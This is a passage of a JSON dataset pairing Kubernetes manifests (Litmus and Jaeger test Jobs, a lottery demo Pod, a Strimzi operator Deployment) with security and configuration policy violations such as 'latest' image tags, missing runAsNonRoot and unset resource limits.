[
  {
    "id": "8406",
    "manifest_path": "data/manifests/the_stack_sample/sample_3127.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: litmus-clone\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_PVC\n          value: openebs-busybox\n        - name: APP_NAMESPACE\n          value: app-busybox-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: CLONE_VOL_CLAIM\n          value: clone-busybox\n        - name: SNAPSHOT\n          value: snapshot-busybox\n        - name: CAPACITY\n          value: 5Gi\n        - name: OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./experiments/functional/clone-creation/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8407",
    "manifest_path": "data/manifests/the_stack_sample/sample_3127.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: litmus-clone\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_PVC\n          value: openebs-busybox\n        - name: APP_NAMESPACE\n          value: app-busybox-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: CLONE_VOL_CLAIM\n          value: clone-busybox\n        - name: SNAPSHOT\n          value: snapshot-busybox\n        - name: CAPACITY\n          value: 5Gi\n        - name: OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./experiments/functional/clone-creation/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ansibletest\" does not have a read-only root file system"
  },
  {
    "id": "8408",
    "manifest_path": "data/manifests/the_stack_sample/sample_3127.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: litmus-clone\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_PVC\n          value: openebs-busybox\n        - name: APP_NAMESPACE\n          value: app-busybox-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: CLONE_VOL_CLAIM\n          value: clone-busybox\n        - name: SNAPSHOT\n          value: snapshot-busybox\n        - name: CAPACITY\n          value: 5Gi\n        - name: OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./experiments/functional/clone-creation/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"litmus\" not found"
  },
  {
    "id": "8409",
    "manifest_path": "data/manifests/the_stack_sample/sample_3127.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: litmus-clone\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_PVC\n          value: openebs-busybox\n        - name: APP_NAMESPACE\n          value: app-busybox-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: CLONE_VOL_CLAIM\n          value: clone-busybox\n        - name: SNAPSHOT\n          value: snapshot-busybox\n        - name: CAPACITY\n          value: 5Gi\n        - name: OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./experiments/functional/clone-creation/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ansibletest\" is not set to runAsNonRoot"
  },
  {
    "id": "8410",
    "manifest_path": "data/manifests/the_stack_sample/sample_3127.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: litmus-clone\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_PVC\n          value: openebs-busybox\n        - name: APP_NAMESPACE\n          value: app-busybox-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: CLONE_VOL_CLAIM\n          value: clone-busybox\n        - name: SNAPSHOT\n          value: snapshot-busybox\n        - name: CAPACITY\n          value: 5Gi\n        - name: OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./experiments/functional/clone-creation/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ansibletest\" has cpu request 0"
  },
  {
    "id": "8411",
    "manifest_path": "data/manifests/the_stack_sample/sample_3127.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: litmus-clone\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_PVC\n          value: openebs-busybox\n        - name: APP_NAMESPACE\n          value: app-busybox-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: CLONE_VOL_CLAIM\n          value: clone-busybox\n        - name: SNAPSHOT\n          value: snapshot-busybox\n        - name: CAPACITY\n          value: 5Gi\n        - name: OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./experiments/functional/clone-creation/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ansibletest\" has memory limit 0"
  },
  {
    "id": "8412",
    "manifest_path": "data/manifests/the_stack_sample/sample_3129.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: report-span-1\nspec:\n  template:\n    spec:\n      containers:\n      - name: report-span-1\n        image: local/asserts:e2e\n        command:\n        - ./reporter\n        - --days\n        - '2'\n        - --services\n        - '1'\n        - --verbose\n        env:\n        - name: JAEGER_SERVICE_NAME\n          value: my-test-service\n        - name: OPERATION_NAME\n          value: my-little-op\n        - name: JAEGER_ENDPOINT\n          value: http://my-jaeger-collector-headless:14268/api/traces\n        - name: JAEGER_QUERY\n          value: http://my-jaeger-query:16686/api/traces\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8413",
    "manifest_path": "data/manifests/the_stack_sample/sample_3129.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: report-span-1\nspec:\n  template:\n    spec:\n      containers:\n      - name: report-span-1\n        image: local/asserts:e2e\n        command:\n        - ./reporter\n        - --days\n        - '2'\n        - --services\n        - '1'\n        - --verbose\n        env:\n        - name: JAEGER_SERVICE_NAME\n          value: my-test-service\n        - name: OPERATION_NAME\n          value: my-little-op\n        - name: JAEGER_ENDPOINT\n          value: http://my-jaeger-collector-headless:14268/api/traces\n        - name: JAEGER_QUERY\n          value: http://my-jaeger-query:16686/api/traces\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"report-span-1\" does not have a read-only root file system"
  },
  {
    "id": "8414",
    "manifest_path": "data/manifests/the_stack_sample/sample_3129.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: report-span-1\nspec:\n  template:\n    spec:\n      containers:\n      - name: report-span-1\n        image: local/asserts:e2e\n        command:\n        - ./reporter\n        - --days\n        - '2'\n        - --services\n        - '1'\n        - --verbose\n        env:\n        - name: JAEGER_SERVICE_NAME\n          value: my-test-service\n        - name: OPERATION_NAME\n          value: my-little-op\n        - name: JAEGER_ENDPOINT\n          value: http://my-jaeger-collector-headless:14268/api/traces\n        - name: JAEGER_QUERY\n          value: http://my-jaeger-query:16686/api/traces\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"report-span-1\" is not set to runAsNonRoot"
  },
  {
    "id": "8415",
    "manifest_path": "data/manifests/the_stack_sample/sample_3129.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: report-span-1\nspec:\n  template:\n    spec:\n      containers:\n      - name: report-span-1\n        image: local/asserts:e2e\n        command:\n        - ./reporter\n        - --days\n        - '2'\n        - --services\n        - '1'\n        - --verbose\n        env:\n        - name: JAEGER_SERVICE_NAME\n          value: my-test-service\n        - name: OPERATION_NAME\n          value: my-little-op\n        - name: JAEGER_ENDPOINT\n          value: http://my-jaeger-collector-headless:14268/api/traces\n        - name: JAEGER_QUERY\n          value: http://my-jaeger-query:16686/api/traces\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"report-span-1\" has cpu request 0"
  },
  {
    "id": "8416",
    "manifest_path": "data/manifests/the_stack_sample/sample_3129.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: report-span-1\nspec:\n  template:\n    spec:\n      containers:\n      - name: report-span-1\n        image: local/asserts:e2e\n        command:\n        - ./reporter\n        - --days\n        - '2'\n        - --services\n        - '1'\n        - --verbose\n        env:\n        - name: JAEGER_SERVICE_NAME\n          value: my-test-service\n        - name: OPERATION_NAME\n          value: my-little-op\n        - name: JAEGER_ENDPOINT\n          value: http://my-jaeger-collector-headless:14268/api/traces\n        - name: JAEGER_QUERY\n          value: http://my-jaeger-query:16686/api/traces\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"report-span-1\" has memory limit 0"
  },
  {
    "id": "8417",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"lottery-generator\" is using an invalid container image, \"alpine:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8418",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lottery-generator\" does not have a read-only root file system"
  },
  {
    "id": "8419",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lottery-websvc\" does not have a read-only root file system"
  },
  {
    "id": "8420",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lottery-generator\" is not set to runAsNonRoot"
  },
  {
    "id": "8421",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lottery-websvc\" is not set to runAsNonRoot"
  },
  {
    "id": "8422",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"lottery-generator\" has cpu request 0"
  },
  {
    "id": "8423",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"lottery-websvc\" has cpu request 0"
  },
  {
    "id": "8424",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"lottery-generator\" has memory limit 0"
  },
  {
    "id": "8425",
    "manifest_path": "data/manifests/the_stack_sample/sample_3130.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: prod-lottery-app\n  labels:\n    app: lottery-app\n    environment: production\n    app.kubernetes.io/name: lottery-app\n    app.kubernetes.io/version: 1.0.0\n    app.kubernetes.io/component: webapp\nspec:\n  containers:\n  - name: lottery-websvc\n    image: nginx:stable\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: html-content\n      mountPath: /usr/share/nginx/html\n  - name: lottery-generator\n    image: alpine:latest\n    volumeMounts:\n    - name: html-content\n      mountPath: /html\n    command:\n    - /bin/sh\n    - -c\n    args:\n    - while true; do echo \"<html><head><title>Lottery</title></head><body><h1>Tonight's\n      lottery number</h1><p>\"`od -vAn -N2 -tu2 < /dev/urandom`\"</p></body></html>\"\n      > /html/index.html; sleep 15; done\n  volumes:\n  - name: html-content\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"lottery-websvc\" has memory limit 0"
  },
  {
    "id": "8426",
    "manifest_path": "data/manifests/the_stack_sample/sample_3132.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:latest\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.21.3\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:latest\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:latest\n        - name: STRIMZI_DEFAULT_MAVEN_BUILDER\n          value: quay.io/strimzi/maven-builder:latest\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"strimzi-cluster-operator\" is using an invalid container image, \"quay.io/strimzi/operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8427",
    "manifest_path": "data/manifests/the_stack_sample/sample_3132.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:latest\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.21.3\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:latest\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:latest\n        - name: STRIMZI_DEFAULT_MAVEN_BUILDER\n          value: quay.io/strimzi/maven-builder:latest\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"strimzi-cluster-operator\" does not have a read-only root file system"
  },
  {
    "id": "8428",
    "manifest_path": "data/manifests/the_stack_sample/sample_3132.yaml",
